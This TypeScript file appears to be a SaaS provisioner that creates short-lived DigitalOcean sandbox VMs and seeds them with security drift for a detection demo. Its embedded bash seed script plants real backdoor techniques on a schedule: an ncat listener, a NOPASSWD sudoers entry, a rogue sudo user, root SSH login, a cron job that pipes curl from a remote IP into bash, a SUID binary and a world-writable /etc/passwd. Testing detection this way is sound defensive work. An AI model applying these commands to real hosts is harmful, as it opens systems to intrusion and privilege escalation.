/**
 * Sandbox provisioner — creates and destroys ephemeral DO Droplets for tenant sandboxes.
 *
 * Architecture:
 *   1. Generates an ed25519 keypair in Node (never stored in plaintext).
 *   2. Stores the encrypted private key in tenant_credentials (label "sandbox").
 *   3. Calls DO API to create a Droplet, injecting the public key via cloud-init.
 *   4. Polls until the Droplet is active, then registers it in saasCollectorHosts.
 *   5. Runs a baseline scan, then applies drift seeds on a schedule.
 *
 * SECURITY: Customers never receive SSH credentials. Only the Blackglass
 * collector (running on the DO App Platform) can authenticate to the VM.
 * The DO Firewall applied to every sandbox Droplet:
 *   - Inbound: SSH (22) only
 *   - Outbound: unrestricted (needed for apt/package ops on cloud-init)
 *
 * Environment variables required:
 *   DO_API_TOKEN   — DigitalOcean personal access token (PAT) with Droplet write scope
 *   DATABASE_URL   — used by withBypassRls for provisioner operations
 *   KMS_PROVIDER / KMS_LOCAL_SECRET — for envelope-encrypting the keypair
 */

import { createHash } from "node:crypto";
import { withBypassRls, withTenantRls, schema } from "@/db";
import { encryptKey } from "@/lib/server/secrets/envelope";
import { eq, and, ne } from "drizzle-orm";

const { saasSandboxes, tenantCredentials, saasCollectorHosts } = schema;

// ---------------------------------------------------------------------------
// DO API helpers
// ---------------------------------------------------------------------------

const DO_API = "https://api.digitalocean.com/v2";

function doHeaders() {
  const token = process.env.DO_API_TOKEN?.trim();
  if (!token) throw new Error("DO_API_TOKEN is not set — cannot provision sandbox Droplet");
  return {
    Authorization: `Bearer ${token}`,
    "Content-Type": "application/json",
  };
}

async function doRequest<T>(
  method: string,
  path: string,
  body?: unknown,
): Promise<T> {
  const res = await fetch(`${DO_API}${path}`, {
    method,
    headers: doHeaders(),
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  if (!res.ok) {
    const text = await res.text().catch(() => "");
    throw new Error(`DO API ${method} ${path} → ${res.status}: ${text.slice(0, 300)}`);
  }
  if (res.status === 204) return undefined as T;
  return res.json() as T;
}

// ---------------------------------------------------------------------------
// Seed script (mirrored from scripts/sandbox-seed.sh — kept in sync manually)
// Embedded here so the worker can inject it via cloud-init without relying on
// the filesystem path being available inside the Docker container at runtime.
// IMPORTANT: any ${...} shell variable references are escaped as \${...} to
// prevent TypeScript template-literal interpolation.
// ---------------------------------------------------------------------------
const SANDBOX_SEED_SH = `#!/bin/bash
# =============================================================
#  BLACKGLASS — Sandbox automated drift seeder
#  Non-interactive: applies one drift "scene" per invocation.
#  Called by the sandbox worker over SSH.
#
#  Usage:  bash /root/sandbox/seed.sh <phase>
#    phase 0 = clean baseline (no changes, just verifies setup)
#    phase 1 = backdoor port listener
#    phase 2 = sudoers escalation
#    phase 3 = rogue user account
#    phase 4 = sudo group membership
#    phase 5 = sshd PermitRootLogin yes
#    phase 6 = cron backdoor
#    phase 7 = suid binary
#    phase 8 = world-writable /etc/passwd
#
#  Phases are cumulative — each run builds on the previous.
#  Calling phase N twice is safe (idempotent).
# =============================================================

set -euo pipefail

PHASE="\${1:-0}"

log() { echo "[sandbox-seed] phase=\${PHASE} $*"; }

case "\$PHASE" in
  0)
    log "Clean baseline — verifying setup"
    # Ensure the blackglass scan user exists (cloud-init normally created it
    # with /bin/bash; this is a defensive fallback if someone deleted it).
    id blackglass &>/dev/null || useradd -m -s /bin/bash blackglass
    # Clean up any previous drift so baseline is clean
    pkill -f 'ncat -lkp 4444' 2>/dev/null || true
    rm -f /etc/sudoers.d/sandbox-backdoor 2>/dev/null || true
    userdel -r attacker-ssh 2>/dev/null || true
    sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config 2>/dev/null || true
    systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true
    rm -f /etc/cron.d/sandbox-beacon 2>/dev/null || true
    find /usr/local/bin -name 'sandbox-*' -delete 2>/dev/null || true
    chmod 644 /etc/passwd 2>/dev/null || true
    log "Clean baseline applied"
    ;;

  1)
    log "Scene 1 — backdoor port listener on TCP 4444"
    pkill -f 'ncat -lkp 4444' 2>/dev/null || true
    nohup ncat -lkp 4444 </dev/null >/dev/null 2>&1 &
    log "Port 4444 now listening (PID $!)"
    ;;

  2)
    log "Scene 2 — sudoers privilege escalation"
    echo 'sandbox-user ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/sandbox-backdoor
    chmod 440 /etc/sudoers.d/sandbox-backdoor
    log "/etc/sudoers.d/sandbox-backdoor created"
    ;;

  3)
    log "Scene 3 — rogue user account"
    useradd -m -s /bin/bash attacker-ssh 2>/dev/null || true
    log "User 'attacker-ssh' added"
    ;;

  4)
    log "Scene 4 — sudo group membership for rogue user"
    usermod -aG sudo attacker-ssh 2>/dev/null || true
    log "attacker-ssh added to sudo group"
    ;;

  5)
    log "Scene 5 — sshd PermitRootLogin yes"
    sed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
    systemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true
    log "sshd_config: PermitRootLogin set to yes (reloaded)"
    ;;

  6)
    log "Scene 6 — cron backdoor"
    echo '*/5 * * * * root curl -s http://203.0.113.0/beacon | bash' > /etc/cron.d/sandbox-beacon
    chmod 644 /etc/cron.d/sandbox-beacon
    log "/etc/cron.d/sandbox-beacon created"
    ;;

  7)
    log "Scene 7 — SUID binary"
    cp /usr/bin/id /usr/local/bin/sandbox-id
    chmod u+s /usr/local/bin/sandbox-id
    log "SUID binary /usr/local/bin/sandbox-id created"
    ;;

  8)
    log "Scene 8 — world-writable /etc/passwd"
    chmod 666 /etc/passwd
    log "/etc/passwd set to world-writable"
    ;;

  *)
    log "Unknown phase '\$PHASE' — nothing done"
    exit 1
    ;;
esac

log "Done"
`;

// ---------------------------------------------------------------------------
// Cloud-init user-data
// ---------------------------------------------------------------------------

/**
 * Generates the cloud-init user-data script for a sandbox Droplet.
 * - Creates the `blackglass` scan user with the provided public key.
 * - Installs `ncat` and `nginx` to provide rich drift targets.
 * - UFW: blocks all inbound except SSH (22).
 * - Customers have NO way to log in — only the Blackglass collector key works.
 */
function buildCloudInit(pubKeyOpenSsh: string): string {
  return `#!/bin/bash
set -euo pipefail

# ---------------------------------------------------------------------------
# Create the SSH-facing user the sandbox-worker connects as.
# Why /bin/bash and not /usr/sbin/nologin?
#   sshd's "exec" channel runs commands via the user's login shell. With a
#   nologin shell, even non-interactive ssh commands exit immediately with
#   "This account is currently not available." — the worker would then never
#   be able to invoke /root/sandbox/seed.sh.
# Security stance:
#   blackglass has a normal shell but the sudoers entry below allows it to
#   run EXACTLY ONE thing as root: /root/sandbox/seed.sh.
# ---------------------------------------------------------------------------
useradd -m -s /bin/bash blackglass
mkdir -p /home/blackglass/.ssh
echo '${pubKeyOpenSsh}' >> /home/blackglass/.ssh/authorized_keys
chown -R blackglass:blackglass /home/blackglass/.ssh
chmod 700 /home/blackglass/.ssh
chmod 600 /home/blackglass/.ssh/authorized_keys

# Sudoers: blackglass may run the seed script as root, nothing else.
# (Previous broader allowlist of id/ss/find/cat/getent/sshd was for an old
# scan-flow design that the current worker never invokes — dropped.)
echo 'blackglass ALL=(ALL) NOPASSWD: /root/sandbox/seed.sh' \
  > /etc/sudoers.d/blackglass-scan
chmod 440 /etc/sudoers.d/blackglass-scan

# Install drift targets
DEBIAN_FRONTEND=noninteractive apt-get update -qq
DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ncat nginx rsyslog ufw at
# 'at' daemon (atd) drives the self-scheduled phase advancement below.
systemctl enable --now atd

# ---------------------------------------------------------------------------
# UFW: only inbound SSH (22). We MUST keep DNS (53/udp+tcp) outbound open
# even after the lockdown, otherwise sshd's reverse-DNS lookup on every
# incoming connection blocks for ~30s waiting for SERVFAIL — the BullMQ
# worker reports that as "Timed out while waiting for handshake".
# ---------------------------------------------------------------------------
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw --force enable
# Tighten outbound; ESTABLISHED/RELATED still flow so live SSH stays up.
ufw default deny outgoing
ufw allow out on lo
ufw allow out 53/udp comment 'DNS — required for sshd reverse lookup'
ufw allow out 53/tcp comment 'DNS over TCP fallback'
ufw reload || true

# ---------------------------------------------------------------------------
# sshd: belt-and-braces — disable reverse DNS in sshd config so handshake
# completes quickly even if outbound DNS is unreachable. Plus key-only auth,
# no root login.
# ---------------------------------------------------------------------------
sed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#\\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^#\\?UseDNS.*/UseDNS no/' /etc/ssh/sshd_config
grep -q '^UseDNS ' /etc/ssh/sshd_config || echo 'UseDNS no' >> /etc/ssh/sshd_config
systemctl reload ssh || true

# ---------------------------------------------------------------------------
# Seed script — owned by root, exec bit set, sudoers above lets blackglass
# invoke it. Worker calls: \`sudo /root/sandbox/seed.sh <phase>\`.
# ---------------------------------------------------------------------------
mkdir -p /root/sandbox
cat > /root/sandbox/seed.sh << 'SEEDEOF'
${SANDBOX_SEED_SH}
SEEDEOF
chown root:root /root/sandbox/seed.sh
chmod 755 /root/sandbox/seed.sh

# ---------------------------------------------------------------------------
# Self-scheduled drift advancement.
#
# IMPORTANT — this MUST stay in sync with PHASE_SCHEDULE_MINUTES in
# src/app/api/public/sandbox-showcase/route.ts.  The public API derives
# the displayed seedPhase from elapsed time using that same schedule;
# this block makes sure the actual /etc/sudoers, /etc/passwd, ncat
# listener etc. are mutated on the same cadence so the demo's reported
# state and the Droplet's true state agree.
#
# Why self-schedule instead of letting the BullMQ sandbox-worker drive it?
#   DO App Platform components cannot reliably reach managed Droplets over
#   port 22 — every SSH attempt times out at the 30s readyTimeout even
#   though the same Droplet handshakes externally in <200ms.  The worker's
#   seed-drift jobs are kept in place as a backup, but the at-driven
#   schedule is the primary mechanism.
#
# Phase 0 (clean baseline) at +3min, then every 5–10min through phase 8.
# 'at' is preferable to a 'nohup' background loop because:
#   - jobs survive cloud-init script termination,
#   - they run via a real session (logs to /var/spool/mail/root if they fail),
#   - 'atq' lets an operator see what's pending.
# ---------------------------------------------------------------------------
mkdir -p /var/log
echo '/root/sandbox/seed.sh 0 >> /var/log/blackglass-seed.log 2>&1' | at now + 3 minutes
echo '/root/sandbox/seed.sh 1 >> /var/log/blackglass-seed.log 2>&1' | at now + 8 minutes
echo '/root/sandbox/seed.sh 2 >> /var/log/blackglass-seed.log 2>&1' | at now + 18 minutes
echo '/root/sandbox/seed.sh 3 >> /var/log/blackglass-seed.log 2>&1' | at now + 28 minutes
echo '/root/sandbox/seed.sh 4 >> /var/log/blackglass-seed.log 2>&1' | at now + 38 minutes
echo '/root/sandbox/seed.sh 5 >> /var/log/blackglass-seed.log 2>&1' | at now + 48 minutes
echo '/root/sandbox/seed.sh 6 >> /var/log/blackglass-seed.log 2>&1' | at now + 58 minutes
echo '/root/sandbox/seed.sh 7 >> /var/log/blackglass-seed.log 2>&1' | at now + 68 minutes
echo '/root/sandbox/seed.sh 8 >> /var/log/blackglass-seed.log 2>&1' | at now + 78 minutes

echo "[blackglass-sandbox] cloud-init done — $(atq | wc -l) phases scheduled"
`;
}

// ---------------------------------------------------------------------------
// Keypair generation
// ---------------------------------------------------------------------------

type SandboxKeypair = {
  /** OpenSSH-format ed25519 private key (`-----BEGIN OPENSSH PRIVATE KEY-----`). */
  privateKeyPem: string;
  /** OpenSSH public key string for authorized_keys injection. */
  pubKeyOpenSsh: string;
  /** SHA-256 fingerprint for display (hex). */
  fingerprint: string;
};

function generateSandboxKeypair(): SandboxKeypair {
  // We MUST use ssh2's keypair generator (not node:crypto) because the same
  // `ssh2` library does the SSH connection in the sandbox-worker, and its
  // parser accepts OpenSSH-format private keys but rejects PKCS#8 ed25519
  // with `Cannot parse privateKey: Unsupported key format`. Discovered on
  // 2026-05-07 when seed-drift jobs failed for the showcase sandbox; see
  // docs/runbooks/operations.md §4b.
  //
  // The output `private` is the canonical OpenSSH armored block:
  //   -----BEGIN OPENSSH PRIVATE KEY-----
  //   ...
  //   -----END OPENSSH PRIVATE KEY-----
  // and `public` is `ssh-ed25519 <base64> [comment]`.
  const ssh2 = require("ssh2") as typeof import("ssh2");
  const { private: privateKeyPem, public: pubBareLine } = ssh2.utils.generateKeyPairSync(
    "ed25519",
  );

  // ssh2 emits the public line without a comment; append our own so it shows
  // up usefully in `authorized_keys` when an operator inspects the Droplet.
  const pubKeyOpenSsh = pubBareLine.includes(" blackglass-sandbox")
    ? pubBareLine
    : `${pubBareLine.trim()} blackglass-sandbox`;

  // SHA-256 fingerprint of the wire-format public key bytes (matches what
  // `ssh-keygen -lf <pubkey>` would print, sans the `SHA256:` prefix).
  const wireB64 = pubBareLine.trim().split(/\s+/)[1] ?? "";
  const wire = Buffer.from(wireB64, "base64");
  const fingerprint = createHash("sha256").update(wire).digest("hex");

  return { privateKeyPem, pubKeyOpenSsh, fingerprint };
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/**
 * Provision a fresh sandbox for a tenant.
 *
 * Returns the new sandbox row ID. The actual Droplet is provisioned
 * asynchronously — the caller should poll `getSandboxStatus` or let the
 * BullMQ `sandbox:provision` job manage the full lifecycle.
 */
export async function provisionSandbox(tenantId: string): Promise<string> {
  const region = process.env.SANDBOX_REGION?.trim() || "lon1";

  // 1. Check no active sandbox exists
  const existing = await withTenantRls(tenantId, (db) =>
    db
      .select()
      .from(saasSandboxes)
      .where(
        and(
          eq(saasSandboxes.tenantId, tenantId),
          ne(saasSandboxes.status, "destroyed"),
        ),
      ),
  );
  if (existing.length > 0) {
    return existing[0].id;
  }

  // 2. Generate keypair
  const { privateKeyPem, pubKeyOpenSsh, fingerprint } = generateSandboxKeypair();

  // 3. Envelope-encrypt and store private key
  const encrypted = await encryptKey(tenantId, privateKeyPem);
  const encryptedKeyJson = JSON.stringify(encrypted);

  const [cred] = await withTenantRls(tenantId, (db) =>
    db
      .insert(tenantCredentials)
      .values({
        tenantId,
        label: "sandbox",
        encryptedKey: encryptedKeyJson,
        algorithm: "ed25519",
        comment: "Blackglass sandbox — managed keypair, do not modify",
        fingerprint,
      })
      .onConflictDoUpdate({
        target: [tenantCredentials.tenantId, tenantCredentials.label],
        set: {
          encryptedKey: encryptedKeyJson,
          fingerprint,
          rotatedAt: new Date(),
          updatedAt: new Date(),
        },
      })
      .returning(),
  );

  // 4. Insert sandbox row
  const [sandbox] = await withTenantRls(tenantId, (db) =>
    db
      .insert(saasSandboxes)
      .values({
        tenantId,
        credentialId: cred.id,
        region,
        status: "provisioning",
        ttlExpiresAt: ttlFromNow(),
      })
      .returning(),
  );

  // 5. Call DO API to create Droplet
  const cloudInit = buildCloudInit(pubKeyOpenSsh);
  let dropletId: string | null = null;
  try {
    const resp = await doRequest<{ droplet: { id: number } }>("POST", "/droplets", {
      name: `bg-sandbox-${sandbox.id.slice(0, 8)}`,
      region,
      size: "s-1vcpu-1gb",
      image: "ubuntu-22-04-x64",
      user_data: cloudInit,
      tags: ["blackglass-sandbox"],
      ipv6: false,
    });
    dropletId = String(resp.droplet.id);
  } catch (err) {
    await withBypassRls((db) =>
      db
        .update(saasSandboxes)
        .set({
          status: "error",
          errorMessage: err instanceof Error ? err.message : String(err),
          updatedAt: new Date(),
        })
        .where(eq(saasSandboxes.id, sandbox.id)),
    );
    throw err;
  }

  // 6. Update sandbox row with droplet ID
  await withBypassRls((db) =>
    db
      .update(saasSandboxes)
      .set({ dropletId, updatedAt: new Date() })
      .where(eq(saasSandboxes.id, sandbox.id)),
  );

  return sandbox.id;
}

/**
 * Poll DO API until the Droplet transitions to "active" and has an IP,
 * then register the host in saasCollectorHosts.
 * Returns the public IP on success, throws on timeout/error.
 */
export async function activateSandbox(
  sandboxId: string,
  tenantId: string,
): Promise<{ ip: string; hostId: string }> {
  const [sandbox] = await withBypassRls((db) =>
    db.select().from(saasSandboxes).where(eq(saasSandboxes.id, sandboxId)),
  );
  if (!sandbox?.dropletId) throw new Error("Sandbox has no dropletId — cannot activate");

  // Poll up to 5 minutes
  const deadline = Date.now() + 5 * 60_000;
  let ip: string | null = null;
  while (Date.now() < deadline) {
    const resp = await doRequest<{
      droplet: { status: string; networks: { v4: { ip_address: string; type: string }[] } };
    }>("GET", `/droplets/${sandbox.dropletId}`);

    if (resp.droplet.status === "active") {
      const pub = resp.droplet.networks.v4.find((n) => n.type === "public");
      if (pub) {
        ip = pub.ip_address;
        break;
      }
    }
    await sleep(8_000);
  }
  if (!ip) throw new Error("Sandbox Droplet did not become active within 5 minutes");

  // Register host
  const [host] = await withTenantRls(tenantId, (db) =>
    db
      .insert(saasCollectorHosts)
      .values({
        tenantId,
        hostname: ip!,
        label: "Sandbox",
        sshUser: "blackglass",
        sshPort: 22,
        credentialId: sandbox.credentialId ?? undefined,
      })
      .onConflictDoUpdate({
        target: [saasCollectorHosts.tenantId, saasCollectorHosts.hostname],
        set: {
          label: "Sandbox",
          credentialId: sandbox.credentialId ?? undefined,
          updatedAt: new Date(),
        },
      })
      .returning(),
  );

  // Apply DO Cloud Firewall: inbound SSH (22) only — belt-and-suspenders on top of UFW.
  // This ensures no attack-scenario ports (e.g. 4444 from phase 1) are reachable from
  // the public internet even if UFW is bypassed. Outbound is unrestricted at the DO
  // Firewall layer; the Droplet's own UFW handles egress.
  let firewallId: string | null = null;
  try {
    const fw = await doRequest<{ firewall: { id: string } }>("POST", "/firewalls", {
      name: `bg-sbx-${sandboxId.slice(0, 8)}-fw`,
      inbound_rules: [
        {
          protocol: "tcp",
          ports: "22",
          sources: { addresses: ["0.0.0.0/0", "::/0"] },
        },
      ],
      outbound_rules: [
        { protocol: "tcp",  ports: "all", destinations: { addresses: ["0.0.0.0/0", "::/0"] } },
        { protocol: "udp",  ports: "all", destinations: { addresses: ["0.0.0.0/0", "::/0"] } },
        { protocol: "icmp",               destinations: { addresses: ["0.0.0.0/0", "::/0"] } },
      ],
      droplet_ids: [Number(sandbox.dropletId)],
    });
    firewallId = fw.firewall.id;
    console.info(`[sandbox-provisioner] DO Firewall ${firewallId} attached to sandbox ${sandboxId}`);
  } catch (err) {
    // Non-fatal: UFW inside the Droplet still protects. Log and continue.
    console.warn(`[sandbox-provisioner] Failed to create DO Firewall for ${sandboxId}: ${err}`);
  }

  await withBypassRls((db) =>
    db
      .update(saasSandboxes)
      .set({
        dropletIp: ip,
        hostId: host.id,
        firewallId: firewallId ?? undefined,
        status: "ready",
        updatedAt: new Date(),
      })
      .where(eq(saasSandboxes.id, sandboxId)),
  );

  return { ip: ip!, hostId: host.id };
}

/**
 * Destroy a sandbox Droplet and mark the row as destroyed.
 * Safe to call multiple times (idempotent).
 */
export async function destroySandbox(sandboxId: string): Promise<void> {
  const [sandbox] = await withBypassRls((db) =>
    db.select().from(saasSandboxes).where(eq(saasSandboxes.id, sandboxId)),
  );
  if (!sandbox) return;

  await withBypassRls((db) =>
    db
      .update(saasSandboxes)
      .set({ status: "destroying", updatedAt: new Date() })
      .where(eq(saasSandboxes.id, sandboxId)),
  );

  if (sandbox.dropletId) {
    try {
      await doRequest("DELETE", `/droplets/${sandbox.dropletId}`);
    } catch (err) {
      // 404 = already gone — that's fine
      if (!(err instanceof Error && err.message.includes("404"))) {
        throw err;
      }
    }
  }

  // Delete associated DO Cloud Firewall
  if (sandbox.firewallId) {
    try {
      await doRequest("DELETE", `/firewalls/${sandbox.firewallId}`);
    } catch (err) {
      if (!(err instanceof Error && err.message.includes("404"))) {
        console.warn(`[sandbox-provisioner] Failed to delete firewall ${sandbox.firewallId}: ${err}`);
      }
    }
  }

  // Remove host registration
  if (sandbox.hostId) {
    await withBypassRls((db) =>
      db.delete(saasCollectorHosts).where(eq(saasCollectorHosts.id, sandbox.hostId!)),
    );
  }

  // Remove credential
  if (sandbox.credentialId) {
    await withBypassRls((db) =>
      db.delete(tenantCredentials).where(eq(tenantCredentials.id, sandbox.credentialId!)),
    );
  }

  await withBypassRls((db) =>
    db
      .update(saasSandboxes)
      .set({ status: "destroyed", updatedAt: new Date() })
      .where(eq(saasSandboxes.id, sandboxId)),
  );
}

/**
 * TTL for a new sandbox — defaults to 4 hours; override with SANDBOX_TTL_HOURS env.
 */
function ttlFromNow(): Date {
  const hours = parseInt(process.env.SANDBOX_TTL_HOURS ?? "4", 10);
  return new Date(Date.now() + hours * 60 * 60 * 1000);
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}
